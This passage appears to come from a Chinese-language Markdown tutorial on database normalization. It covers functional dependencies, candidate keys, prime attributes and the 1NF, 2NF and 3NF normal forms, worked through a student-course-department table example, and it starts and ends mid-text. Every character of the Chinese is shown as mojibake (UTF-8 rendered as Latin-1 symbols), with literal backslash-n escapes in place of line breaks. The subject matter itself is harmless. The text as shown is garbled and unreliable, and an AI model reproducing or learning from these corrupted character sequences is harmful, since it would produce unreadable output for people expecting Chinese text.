)\n\nè®¾X,Yæ˜¯å…³ç³»Rçš„ä¸¤ä¸ªå±æ€§é›†åˆï¼Œå½“ä»»ä½•æ—¶åˆ»Rä¸­çš„ä»»æ„ä¸¤ä¸ªå…ƒç»„ä¸­çš„Xå±æ€§å€¼ç›¸åŒæ—¶ï¼Œåˆ™å®ƒä»¬çš„Yå±æ€§å€¼ä¹Ÿç›¸åŒï¼Œåˆ™ç§°Xå‡½æ•°å†³å®šYï¼Œæˆ–Yå‡½æ•°ä¾èµ–äºXã€‚\n\n+ åœ¨ä¸€ä¸ªè¡¨ä¸­,  Xçš„å€¼ç¡®å®šçš„æƒ…å†µä¸‹ï¼Œå¿…å®šèƒ½ç¡®å®šå±æ€§Yçš„å€¼,  è¿™å°±æ˜¯å‡½æ•°ä¾èµ–åå­—çš„ç”±æ¥ï¼Œç±»ä¼¼äºå‡½æ•°å…³ç³» y = f(x)\n+ å§“åå‡½æ•°ä¾èµ–äºå­¦å·ï¼Œå†™ä½œ **å­¦å· â†’ å§“å**ã€‚\n+ ä¸èƒ½è¯´å­¦å·å‡½æ•°ä¾èµ–äºå§“åã€‚å§“å ä¸èƒ½å†³å®šå­¦å·, å› ä¸ºæœ‰é‡å.\n\n<!-- more -->\n\n---\n\n## 1.2. å¹³å‡¡å‡½æ•°ä¾èµ–(æˆ‘å†³å®šçš„å€¼è¿˜æ˜¯æˆ‘è‡ªå·±å†…éƒ¨, èµ°ä¸å‡ºè‡ªæˆ‘, äºæ˜¯å¹³å‡¡çš„æˆ‘)\n\nå½“å…³ç³»ä¸­å±æ€§é›†åˆYæ˜¯å±æ€§é›†åˆXçš„å­é›†æ—¶(YâŠ†X)ï¼Œå­˜åœ¨å‡½æ•°ä¾èµ–Xâ†’Yï¼Œå³ä¸€ç»„å±æ€§å‡½æ•°å†³å®šå®ƒçš„æ‰€æœ‰å­é›†ï¼Œè¿™ç§å‡½æ•°ä¾èµ–ç§°ä¸ºå¹³å‡¡å‡½æ•°ä¾èµ–ã€‚\n\n\n\n## 1.3 éå¹³å‡¡å‡½æ•°ä¾èµ–(æˆ‘å†³å®šçš„å€¼å¤§åƒä¸–ç•Œ)\n\nå½“å…³ç³»ä¸­å±æ€§é›†åˆYä¸æ˜¯å±æ€§é›†åˆXçš„å­é›†æ—¶ï¼Œå­˜åœ¨å‡½æ•°ä¾èµ–Xâ†’Yï¼Œåˆ™ç§°è¿™ç§å‡½æ•°ä¾èµ–ä¸ºéå¹³å‡¡å‡½æ•°ä¾èµ–ã€‚\n\n---\n\n## 1.4. å®Œå…¨å‡½æ•°ä¾èµ– (æˆ‘è¦å’Œåˆ«äººä¸€èµ·å†³å®šä½ )\n\nè®¾X,Yæ˜¯å…³ç³»Rçš„ä¸¤ä¸ªå±æ€§é›†åˆï¼ŒXâ€™æ˜¯Xçš„çœŸå­é›†ï¼Œå­˜åœ¨Xâ†’Yï¼Œä½†å¯¹æ¯ä¸€ä¸ªXâ€™éƒ½æœ‰Xâ€™!â†’Yï¼Œåˆ™ç§°Yå®Œå…¨å‡½æ•°ä¾èµ–äºXã€‚\n\n+ ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰Fâ†’ åˆ†æ•° ï¼ˆå› ä¸ºåŒä¸€ä¸ªçš„å­¦å·å¯¹åº”çš„åˆ†æ•°ä¸ç¡®å®šï¼ŒåŒä¸€ä¸ªè¯¾åå¯¹åº”çš„åˆ†æ•°ä¹Ÿä¸ç¡®å®šï¼‰\n+ è‡ªå·±ä¸€ä¸ªäººå†³å®šä¸äº†, éœ€è¦å…±åŒå†³å®š\n\n\n\n## 1.5. éƒ¨åˆ†å‡½æ•°ä¾èµ–(æˆ‘çš„ä¸€éƒ¨åˆ†å°±èƒ½å†³å®šä½ )\n\nè®¾X,Yæ˜¯å…³ç³»Rçš„ä¸¤ä¸ªå±æ€§é›†åˆï¼Œå­˜åœ¨Xâ†’Yï¼Œè‹¥Xâ€™æ˜¯Xçš„çœŸå­é›†ï¼Œå­˜åœ¨Xâ€™â†’Yï¼Œåˆ™ç§°Yéƒ¨åˆ†å‡½æ•°ä¾èµ–äºXã€‚\n\n+ (å­¦å·ï¼Œè¯¾åï¼‰ Pâ†’ å§“å\n+ æˆ‘è‡ªå·±çš„ä¸€éƒ¨åˆ†å°±å¯ä»¥å†³å®š\n\n\n\n## 1.6. ä¼ é€’å‡½æ•°ä¾èµ– (æˆ‘å¯ä»¥é—´æ¥å†³å®šä½ )\n\nè®¾X,Y,Zæ˜¯å…³ç³»Rä¸­äº’ä¸ç›¸åŒçš„å±æ€§é›†åˆï¼Œå­˜åœ¨Xâ†’Y(Y !â†’X),Yâ†’Zï¼Œåˆ™ç§°Zä¼ é€’å‡½æ•°ä¾èµ–äºXã€‚\n\n\n\n# 2. ç å’Œä¸»å±æ€§\n\n## 2.1 ç \n\nè®¾ K ä¸ºæŸè¡¨ä¸­çš„ä¸€ä¸ªå±æ€§æˆ–å±æ€§ç»„ï¼Œè‹¥é™¤ K ä¹‹å¤–çš„æ‰€æœ‰å±æ€§éƒ½å®Œå…¨å‡½æ•°ä¾èµ–äº Kï¼ˆè¿™ä¸ªâ€œå®Œå…¨â€ä¸è¦æ¼äº†ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç§° K ä¸º**å€™é€‰ç **ï¼Œç®€ç§°ä¸º**ç **ã€‚\n\nåœ¨å®é™…ä¸­æˆ‘ä»¬é€šå¸¸å¯ä»¥ç†è§£ä¸ºï¼šå‡å¦‚å½“ K ç¡®å®šçš„æƒ…å†µä¸‹ï¼Œè¯¥è¡¨é™¤ K ä¹‹å¤–çš„æ‰€æœ‰å±æ€§çš„å€¼ä¹Ÿå°±éšä¹‹ç¡®å®šï¼Œé‚£ä¹ˆ K å°±æ˜¯ç ã€‚ä¸€å¼ è¡¨ä¸­å¯ä»¥æœ‰è¶…è¿‡ä¸€ä¸ªç ã€‚ï¼ˆå®é™…åº”ç”¨ä¸­ä¸ºäº†æ–¹ä¾¿ï¼Œé€šå¸¸é€‰æ‹©å…¶ä¸­çš„ä¸€ä¸ªç ä½œä¸ºä¸»ç ï¼‰\n\n+ 2NFçš„å›¾ **(å­¦å·ã€è¯¾åï¼‰**è¿™ä¸ªå±æ€§ç»„å°±æ˜¯ç ã€‚è¯¥è¡¨ä¸­æœ‰ä¸”ä»…æœ‰è¿™ä¸€ä¸ªç ã€‚\n\n  \n\n## 2.2 ä¸»å±æ€§\n\nåŒ…å«åœ¨ä»»ä½•ä¸€ä¸ªç ä¸­çš„å±æ€§æˆä¸ºä¸»å±æ€§ã€‚\n\n2NFçš„å›¾ä¸»å±æ€§å°±æœ‰ä¸¤ä¸ªï¼Œ**å­¦å·** ä¸ **è¯¾å**ã€‚\n\n\n\n# 3. èŒƒå¼\n\nå…³ç³»æ•°æ®åº“æœ‰å…­ç§ï¼Œ1NFï¼Œ2NFï¼Œ3NFï¼ŒBCNFï¼Œ4NFï¼Œ5NFã€‚\n\n## 3.1 1NF (é—®é¢˜: åŒå­—æ®µå†…å®¹é‡å¤, è¦æ‹†è¡¨->2NF)\n\nç¬¦åˆ1NFçš„å…³ç³»ä¸­çš„æ¯ä¸ªå±æ€§éƒ½ä¸å¯å†åˆ†ã€‚ä¸‹å›¾å°±ä¸ç¬¦åˆ1NFçš„è¦æ±‚.\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/1.png)\n\n1NFæ˜¯å…³ç³»æ¨¡å¼åº”å…·å¤‡çš„æœ€èµ·ç çš„æ¡ä»¶ï¼Œå¦‚æœæ•°æ®åº“è®¾è®¡ä¸èƒ½æ»¡è¶³ç¬¬ä¸€èŒƒå¼ï¼Œå°±ä¸èƒ½ç§°ä¸ºå…³ç³»å‹æ•°æ®åº“ã€‚å…³ç³»æ•°æ®åº“è‡ªå¸¦1NF\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/2.png)\n\n\n\n## 3.2 2NF (é—®é¢˜: éä¸»å±æ€§ä¸åŒå­—æ®µä¹‹é—´å…³è”, è¦æ‹†è¡¨->3NF)\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/3.png)\n\n+ æ¯ä¸€åå­¦ç”Ÿçš„å­¦å·ã€å§“åã€ç³»åã€ç³»ä¸»ä»»è¿™äº›æ•°æ®é‡å¤å¤šæ¬¡ã€‚æ¯ä¸ªç³»ä¸å¯¹åº”çš„ç³»ä¸»ä»»çš„æ•°æ®ä¹Ÿé‡å¤å¤šæ¬¡â€”â€”**æ•°æ®å†—ä½™è¿‡å¤§** \n\n+ å‡å¦‚å­¦æ ¡æ–°å»ºäº†ä¸€ä¸ªç³»ï¼Œä½†æ˜¯æš‚æ—¶è¿˜æ²¡æœ‰æ‹›æ”¶ä»»ä½•å­¦ç”Ÿï¼ˆæ¯”å¦‚3æœˆä»½å°±æ–°å»ºäº†ï¼Œä½†è¦ç­‰åˆ°8æœˆä»½æ‰æ‹›ç”Ÿï¼‰ï¼Œé‚£ä¹ˆæ˜¯æ— æ³•å°†ç³»åä¸ç³»ä¸»ä»»çš„æ•°æ®å•ç‹¬åœ°æ·»åŠ åˆ°æ•°æ®è¡¨ä¸­å»çš„â€”â€”**æ’å…¥å¼‚å¸¸**\n\n+ å‡å¦‚å°†æŸä¸ªç³»ä¸­æ‰€æœ‰å­¦ç”Ÿç›¸å…³çš„è®°å½•éƒ½åˆ é™¤ï¼Œé‚£ä¹ˆæ‰€æœ‰ç³»ä¸ç³»ä¸»ä»»çš„æ•°æ®ä¹Ÿå°±éšä¹‹æ¶ˆå¤±äº†ï¼ˆä¸€ä¸ªç³»æ‰€æœ‰å­¦ç”Ÿéƒ½æ²¡æœ‰äº†ï¼Œå¹¶ä¸è¡¨ç¤ºè¿™ä¸ªç³»å°±æ²¡æœ‰äº†ï¼‰ã€‚â€”â€”**åˆ é™¤å¼‚å¸¸**\n\n+ å‡å¦‚æå°æ˜è½¬ç³»åˆ°æ³•å¾‹ç³»ï¼Œé‚£ä¹ˆä¸ºäº†ä¿è¯æ•°æ®åº“ä¸­æ•°æ®çš„ä¸€è‡´æ€§ï¼Œéœ€è¦ä¿®æ”¹ä¸‰æ¡è®°å½•ä¸­ç³»ä¸ç³»ä¸»ä»»çš„æ•°æ®ã€‚â€”â€”**ä¿®æ”¹å¼‚å¸¸**ã€‚\n\n  æ­£å› ä¸ºä»…ç¬¦åˆ1NFçš„æ•°æ®åº“è®¾è®¡å­˜åœ¨ç€è¿™æ ·é‚£æ ·çš„é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦æé«˜è®¾è®¡æ ‡å‡†ï¼Œå»æ‰å¯¼è‡´ä¸Šè¿°å››ç§é—®é¢˜çš„å› ç´ ï¼Œä½¿å…¶ç¬¦åˆæ›´é«˜ä¸€çº§çš„èŒƒå¼ï¼ˆ2NFï¼‰ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„â€œè§„èŒƒåŒ–â€ã€‚\n\n  \n\n  #### 3.2.1  åˆ¤æ–­æ˜¯å¦ç¬¦åˆ2NF\n\n  æ ¹æ®2NFçš„å®šä¹‰ï¼Œåˆ¤æ–­çš„ä¾æ®å®é™…ä¸Šå°±æ˜¯çœ‹æ•°æ®è¡¨ä¸­**æ˜¯å¦å­˜åœ¨éä¸»å±æ€§å¯¹äºç çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–**ã€‚è‹¥å­˜åœ¨ï¼Œåˆ™æ•°æ®è¡¨æœ€é«˜åªç¬¦åˆ1NFçš„è¦æ±‚ï¼Œè‹¥ä¸å­˜åœ¨ï¼Œåˆ™ç¬¦åˆ2NFçš„è¦æ±‚ã€‚åˆ¤æ–­çš„æ–¹æ³•æ˜¯ï¼š\n\n  \n\n  > ç¬¬ä¸€æ­¥ï¼šæ‰¾å‡ºæ•°æ®è¡¨ä¸­æ‰€æœ‰çš„**ç **ã€‚\n  \n  + æŸ¥çœ‹æ‰€æœ‰æ¯ä¸€å•ä¸ªå±æ€§ï¼Œå½“å®ƒçš„å€¼ç¡®å®šäº†ï¼Œæ˜¯å¦å‰©ä¸‹çš„æ‰€æœ‰å±æ€§å€¼éƒ½èƒ½ç¡®å®šã€‚\n  + æŸ¥çœ‹æ‰€æœ‰åŒ…å«æœ‰ä¸¤ä¸ªå±æ€§çš„å±æ€§ç»„ï¼Œå½“å®ƒçš„å€¼ç¡®å®šäº†ï¼Œæ˜¯å¦å‰©ä¸‹çš„æ‰€æœ‰å±æ€§å€¼éƒ½èƒ½ç¡®å®šã€‚\n+ ä¾æ¬¡æŸ¥çœ‹3ä¸ª4ä¸ª5ä¸ª.....\n  + çœ‹èµ·æ¥å¾ˆéº»çƒ¦æ˜¯å§ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªè¯€çªï¼Œå°±æ˜¯å‡å¦‚Aæ˜¯ç ï¼Œé‚£ä¹ˆæ‰€æœ‰åŒ…å«äº†Açš„å±æ€§ç»„ï¼Œå¦‚ï¼ˆAï¼ŒBï¼‰ã€ï¼ˆAï¼ŒCï¼‰ã€ï¼ˆAï¼ŒBï¼ŒCï¼‰ç­‰ç­‰ï¼Œéƒ½ä¸æ˜¯ç äº†ï¼ˆå› ä¸ºä½œä¸ºç çš„è¦æ±‚é‡Œæœ‰ä¸€ä¸ªâ€œ**å®Œå…¨**å‡½æ•°ä¾èµ–â€ï¼‰ã€‚\n\n  ![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/4.png)\n\n  è¿™ä¸€æ­¥å®Œæˆä»¥åï¼Œå¯ä»¥å¾—åˆ°ï¼Œè¡¨3çš„ç åªæœ‰ä¸€ä¸ªï¼Œå°±æ˜¯**ï¼ˆå­¦å·ã€è¯¾åï¼‰**ã€‚å­¦å·å¹¶ä¸èƒ½ç›´æ¥å†³å®šåˆ†æ•°, æ‰€ä»¥å­¦å·+è¯¾åèƒ½å†³å®šä¸€åˆ‡\n\n  \n\n  > ç¬¬äºŒæ­¥ï¼šæ ¹æ®ç¬¬ä¸€æ­¥æ‰€å¾—åˆ°çš„ç ï¼Œæ‰¾å‡ºæ‰€æœ‰çš„**ä¸»å±æ€§**ã€‚\n  \n  ä¸»å±æ€§æœ‰ä¸¤ä¸ªï¼š**å­¦å·** ä¸ **è¯¾å**\n  \n  > ç¬¬ä¸‰æ­¥ï¼šæ•°æ®è¡¨ä¸­ï¼Œé™¤å»æ‰€æœ‰çš„ä¸»å±æ€§ï¼Œå‰©ä¸‹çš„å°±éƒ½æ˜¯**éä¸»å±æ€§**äº†ã€‚\n  \n  éä¸»å±æ€§æœ‰å››ä¸ªï¼š**å§“å**ã€**ç³»å**ã€**ç³»ä¸»ä»»**ã€**åˆ†æ•°**\n  \n  > ç¬¬å››æ­¥ï¼šæŸ¥çœ‹æ˜¯å¦å­˜åœ¨éä¸»å±æ€§å¯¹ç çš„**éƒ¨åˆ†å‡½æ•°ä¾èµ–**ã€‚\n  \n  å¯¹äº**ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰ â†’ å§“å**ï¼Œæœ‰ **å­¦å· â†’ å§“å**ï¼Œ\t\tå­˜åœ¨éä¸»å±æ€§ å§“å å¯¹ç **ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰**çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ã€‚\n  å¯¹äº**ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰ â†’ ç³»å**ï¼Œæœ‰ **å­¦å· â†’ ç³»å**ï¼Œ\t\tå­˜åœ¨éä¸»å±æ€§ ç³»å å¯¹ç **ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰**çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ã€‚\n  å¯¹äº**ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰ â†’ ç³»ä¸»ä»»**ï¼Œæœ‰ **å­¦å· â†’ ç³»ä¸»ä»»**ï¼Œå­˜åœ¨éä¸»å±æ€§ ç³»ä¸»ä»» å¯¹ç **ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰**çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ã€‚\n  \n  æ‰€ä»¥è¡¨3å­˜åœ¨éä¸»å±æ€§å¯¹äºç çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ï¼Œæœ€é«˜åªç¬¦åˆ1NFçš„è¦æ±‚ï¼Œä¸ç¬¦åˆ2NFçš„è¦æ±‚ã€‚\n\n\n\n#### 3.2.2  æ‹†è¡¨ç¬¦åˆ2NF\n\nä¸ºäº†ç¬¦åˆ2NFçš„è¦æ±‚ï¼Œæˆ‘ä»¬å¿…é¡»æ¶ˆé™¤è¿™äº›éƒ¨åˆ†å‡½æ•°ä¾èµ–ï¼Œåªæœ‰ä¸€ä¸ªåŠæ³•ï¼Œå°±æ˜¯å°†å¤§æ•°æ®è¡¨æ‹†åˆ†æˆä¸¤ä¸ªæˆ–è€…æ›´å¤šä¸ªæ›´å°çš„æ•°æ®è¡¨ï¼Œåœ¨æ‹†åˆ†çš„è¿‡ç¨‹ä¸­ï¼Œè¦è¾¾åˆ°æ›´é«˜ä¸€çº§èŒƒå¼çš„è¦æ±‚ï¼Œè¿™ä¸ªè¿‡ç¨‹å«åšâ€æ¨¡å¼åˆ†è§£â€œã€‚æ¨¡å¼åˆ†è§£çš„æ–¹æ³•ä¸æ˜¯å”¯ä¸€çš„ï¼Œä»¥ä¸‹æ˜¯å…¶ä¸­ä¸€ç§æ–¹æ³•ï¼š\né€‰è¯¾è¡¨ï¼ˆå­¦å·ï¼Œè¯¾åï¼Œåˆ†æ•°ï¼‰\nå­¦ç”Ÿè¡¨ï¼ˆå­¦å·ï¼Œå§“åï¼Œç³»åï¼Œç³»ä¸»ä»»ï¼‰\n\næˆ‘ä»¬å…ˆæ¥åˆ¤æ–­ä»¥ä¸‹ï¼Œ**é€‰è¯¾**è¡¨ä¸**å­¦ç”Ÿ**è¡¨ï¼Œæ˜¯å¦ç¬¦åˆäº†2NFçš„è¦æ±‚ï¼Ÿ\n\nå¯¹äº**é€‰è¯¾**è¡¨ï¼Œå…¶ç æ˜¯**ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰**ï¼Œä¸»å±æ€§æ˜¯**å­¦å·**å’Œ**è¯¾å**ï¼Œéä¸»å±æ€§æ˜¯**åˆ†æ•°**ï¼Œ**å­¦å·**ç¡®å®šï¼Œå¹¶ä¸èƒ½å”¯ä¸€ç¡®å®š**åˆ†æ•°**ï¼Œ**è¯¾å**ç¡®å®šï¼Œä¹Ÿä¸èƒ½å”¯ä¸€ç¡®å®š**åˆ†æ•°**ï¼Œæ‰€ä»¥ä¸å­˜åœ¨éä¸»å±æ€§**åˆ†æ•°**å¯¹äºç  **ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰**çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ï¼Œæ‰€ä»¥æ­¤è¡¨ç¬¦åˆ2NFçš„è¦æ±‚ã€‚\n\nå¯¹äº**å­¦ç”Ÿ**è¡¨ï¼Œå…¶ç æ˜¯**å­¦å·ï¼Œ**ä¸»å±æ€§æ˜¯**å­¦å·**ï¼Œéä¸»å±æ€§æ˜¯**å§“åã€ç³»å**å’Œ**ç³»ä¸»ä»»**ï¼Œå› ä¸ºç åªæœ‰ä¸€ä¸ªå±æ€§ï¼Œæ‰€ä»¥ä¸å¯èƒ½å­˜åœ¨éä¸»å±æ€§å¯¹äºç  çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ï¼Œæ‰€ä»¥æ­¤è¡¨ç¬¦åˆ2NFçš„è¦æ±‚ã€‚\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/5.png)\n\n\n\n#### 3.2.3 å®šä¹‰\n\nå¦‚æœå…³ç³»æ¨¡å¼Ræ˜¯1NFï¼Œä¸”æ¯ä¸€ä¸ªéä¸»å±æ€§å®Œå…¨ä¾èµ–äºå€™é€‰å»ºï¼Œé‚£ä¹ˆå°±ç§°Ræ˜¯ç¬¬äºŒèŒƒå¼ã€‚\n\nç¬¬äºŒèŒƒå¼è¦æ»¡è¶³çš„æ¡ä»¶ï¼šé¦–å…ˆè¦æ»¡è¶³ç¬¬ä¸€èŒƒå¼ï¼Œå…¶æ¬¡æ¯ä¸€ä¸ªéä¸»å±æ€§è¦**å®Œå…¨å‡½æ•°**ä¾èµ–äºå€™é€‰é”®ï¼Œæˆ–è€…æ˜¯ä¸»é”®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯ä¸ªéä¸»å±æ€§æ˜¯ç”±æ•´ä¸ªä¸»é”®å‡½æ•°å†³å®šçš„ï¼Œè€Œä¸èƒ½æœ‰ä¸»é”®çš„ä¸€éƒ¨åˆ†æ¥å†³å®šã€‚\n\n\n\n## 3.3 3NF (é—®é¢˜: ä¸»å±æ€§ä¸åŒå­—æ®µä¹‹é—´å…³è”, è¦æ‹†è¡¨->BCNF)\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/6.png)\n\n+ æå°æ˜è½¬ç³»åˆ°æ³•å¾‹ç³»\n  åªéœ€è¦ä¿®æ”¹ä¸€æ¬¡æå°æ˜å¯¹åº”çš„ç³»çš„å€¼å³å¯ã€‚â€”â€”æœ‰æ”¹è¿›\n\n+ æ•°æ®å†—ä½™æ˜¯å¦å‡å°‘äº†ï¼Ÿ\n  å­¦ç”Ÿçš„å§“åã€ç³»åä¸ç³»ä¸»ä»»ï¼Œä¸å†åƒä¹‹å‰ä¸€æ ·é‡å¤é‚£ä¹ˆå¤šæ¬¡äº†ã€‚â€”â€”æœ‰æ”¹è¿›\n\n+ åˆ é™¤æŸä¸ªç³»ä¸­æ‰€æœ‰çš„å­¦ç”Ÿè®°å½•\n  è¯¥ç³»çš„ä¿¡æ¯ä»ç„¶å…¨éƒ¨ä¸¢å¤±ã€‚â€”â€”æ— æ”¹è¿›\n\n+ æ’å…¥ä¸€ä¸ªå°šæ— å­¦ç”Ÿçš„æ–°ç³»çš„ä¿¡æ¯ã€‚\n  å› ä¸ºå­¦ç”Ÿè¡¨çš„ç æ˜¯å­¦å·ï¼Œä¸èƒ½ä¸ºç©ºï¼Œæ‰€ä»¥æ­¤æ“ä½œä¸è¢«å…è®¸ã€‚â€”â€”æ— æ”¹è¿›\n\n  \n\næ‰€ä»¥è¯´ï¼Œä»…ä»…ç¬¦åˆ2NFçš„è¦æ±‚ï¼Œå¾ˆå¤šæƒ…å†µä¸‹è¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œè€Œå‡ºç°é—®é¢˜çš„åŸå› ï¼Œåœ¨äºä»ç„¶å­˜åœ¨éä¸»å±æ€§**ç³»ä¸»ä»»**å¯¹äºç **å­¦å·**çš„ä¼ é€’å‡½æ•°ä¾èµ–ã€‚ä¸ºäº†èƒ½è¿›ä¸€æ­¥è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†ç¬¦åˆ2NFè¦æ±‚çš„æ•°æ®è¡¨æ”¹è¿›ä¸ºç¬¦åˆ3NFçš„è¦æ±‚ã€‚\n\n**ç¬¬ä¸‰èŒƒå¼ï¼ˆ3NFï¼‰** **3NFåœ¨2NFçš„åŸºç¡€ä¹‹ä¸Šï¼Œæ¶ˆé™¤äº†éä¸»å±æ€§å¯¹äºç çš„ä¼ é€’å‡½æ•°ä¾èµ–**ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ å¦‚æœå­˜åœ¨éä¸»å±æ€§å¯¹äºç çš„ä¼ é€’å‡½æ•°ä¾èµ–ï¼Œåˆ™ä¸ç¬¦åˆ3NFçš„è¦æ±‚ã€‚\n\n\n\n#### 3.3.1 åˆ¤æ–­æ˜¯å¦ç¬¦åˆ3NF\n\næ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹è¡¨ä¸­çš„è®¾è®¡ï¼Œæ˜¯å¦ç¬¦åˆ3NFçš„è¦æ±‚ã€‚\n\n+ å¯¹äº**é€‰è¯¾**è¡¨ï¼Œä¸»ç ä¸ºï¼ˆå­¦å·ï¼Œè¯¾åï¼‰ï¼Œä¸»å±æ€§ä¸º**å­¦å·**å’Œ**è¯¾åï¼Œ**éä¸»å±æ€§åªæœ‰ä¸€ä¸ªï¼Œä¸ºåˆ†æ•°ï¼Œä¸å¯èƒ½å­˜åœ¨ä¼ é€’å‡½æ•°ä¾èµ–ï¼Œæ‰€ä»¥**é€‰è¯¾**è¡¨çš„è®¾è®¡ï¼Œç¬¦åˆ3NFçš„è¦æ±‚ã€‚\n\n+ å¯¹äº**å­¦ç”Ÿ**è¡¨ï¼Œä¸»ç ä¸º**å­¦å·**ï¼Œä¸»å±æ€§ä¸º**å­¦å·**ï¼Œéä¸»å±æ€§ä¸º**å§“å**ã€**ç³»å**å’Œ**ç³»ä¸»ä»»**ã€‚å› ä¸º å­¦å· â†’ ç³»åï¼ŒåŒæ—¶ ç³»å â†’ ç³»ä¸»ä»»ï¼Œæ‰€ä»¥å­˜åœ¨éä¸»å±æ€§**ç³»ä¸»ä»»**å¯¹äºç **å­¦å·**çš„ä¼ é€’å‡½æ•°ä¾èµ–ï¼Œæ‰€ä»¥**å­¦ç”Ÿ**è¡¨çš„è®¾è®¡ï¼Œä¸ç¬¦åˆ3NFçš„è¦æ±‚ã€‚ã€‚\n\n  \n\n#### 3.3.2  æ‹†è¡¨ç¬¦åˆ3NF\n\nä¸ºäº†è®©æ•°æ®è¡¨è®¾è®¡è¾¾åˆ°3NFï¼Œæˆ‘ä»¬å¿…é¡»è¿›ä¸€æ­¥è¿›è¡Œæ¨¡å¼åˆ†è§£ä¸ºä»¥ä¸‹å½¢å¼ï¼š\né€‰è¯¾ï¼ˆå­¦å·ï¼Œè¯¾åï¼Œåˆ†æ•°ï¼‰\nå­¦ç”Ÿï¼ˆå­¦å·ï¼Œå§“åï¼Œç³»åï¼‰\nç³»ï¼ˆç³»åï¼Œç³»ä¸»ä»»ï¼‰\n\n\n\n+ å¯¹äº**é€‰è¯¾**è¡¨ï¼Œç¬¦åˆ3NFçš„è¦æ±‚ï¼Œä¹‹å‰å·²ç»åˆ†æè¿‡äº†ã€‚\n\n+ å¯¹äº**å­¦ç”Ÿ**è¡¨ï¼Œç ä¸º**å­¦å·**ï¼Œä¸»å±æ€§ä¸º**å­¦å·**ï¼Œéä¸»å±æ€§ä¸º**ç³»å**ï¼Œä¸å¯èƒ½å­˜åœ¨éä¸»å±æ€§å¯¹äºç çš„ä¼ é€’å‡½æ•°ä¾èµ–ï¼Œæ‰€ä»¥ç¬¦åˆ3NFçš„è¦æ±‚ã€‚\n\n+ å¯¹äº**ç³»**è¡¨ï¼Œç ä¸º**ç³»å**ï¼Œä¸»å±æ€§ä¸º**ç³»å**ï¼Œéä¸»å±æ€§ä¸º**ç³»ä¸»ä»»**ï¼Œä¸å¯èƒ½å­˜åœ¨éä¸»å±æ€§å¯¹äºç çš„ä¼ é€’å‡½æ•°ä¾èµ–ï¼ˆè‡³å°‘è¦æœ‰ä¸‰ä¸ªå±æ€§æ‰å¯èƒ½å­˜åœ¨ä¼ é€’å‡½æ•°ä¾èµ–å…³ç³»ï¼‰ï¼Œæ‰€ä»¥ç¬¦åˆ3NFçš„è¦æ±‚ã€‚ã€‚\n\n\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/7.png)\n\n\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/8.png)\n\n\n\nç°åœ¨æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ï¼Œè¿›è¡ŒåŒæ ·çš„æ“ä½œï¼Œæ˜¯å¦è¿˜å­˜åœ¨ç€ä¹‹å‰çš„é‚£äº›é—®é¢˜ï¼Ÿ\n\n1. åˆ é™¤æŸä¸ªç³»ä¸­æ‰€æœ‰çš„å­¦ç”Ÿè®°å½•\n   è¯¥ç³»çš„ä¿¡æ¯ä¸ä¼šä¸¢å¤±ã€‚â€”â€”æœ‰æ”¹è¿›\n2. æ’å…¥ä¸€ä¸ªå°šæ— å­¦ç”Ÿçš„æ–°ç³»çš„ä¿¡æ¯ã€‚\n   å› ä¸ºç³»è¡¨ä¸å­¦ç”Ÿè¡¨ç›®å‰æ˜¯ç‹¬ç«‹çš„ä¸¤å¼ è¡¨ï¼Œæ‰€ä»¥ä¸å½±å“ã€‚â€”â€”æœ‰æ”¹è¿›\n3. æ•°æ®å†—ä½™æ›´åŠ å°‘äº†ã€‚â€”â€”æœ‰æ”¹è¿›\n\n\n\nç”±æ­¤å¯è§ï¼Œç¬¦åˆ3NFè¦æ±‚çš„æ•°æ®åº“è®¾è®¡ï¼Œ**åŸºæœ¬**ä¸Šè§£å†³äº†æ•°æ®å†—ä½™è¿‡å¤§ï¼Œæ’å…¥å¼‚å¸¸ï¼Œä¿®æ”¹å¼‚å¸¸ï¼Œåˆ é™¤å¼‚å¸¸çš„é—®é¢˜ã€‚å½“ç„¶ï¼Œåœ¨å®é™…ä¸­ï¼Œå¾€å¾€ä¸ºäº†æ€§èƒ½ä¸Šæˆ–è€…åº”å¯¹æ‰©å±•çš„éœ€è¦ï¼Œç»å¸¸ åšåˆ°2NFæˆ–è€…1NFï¼Œä½†æ˜¯ä½œä¸ºæ•°æ®åº“è®¾è®¡äººå‘˜ï¼Œè‡³å°‘åº”è¯¥çŸ¥é“ï¼Œ3NFçš„è¦æ±‚æ˜¯æ€æ ·çš„ã€‚\n\n\n\n#### 3.3.3 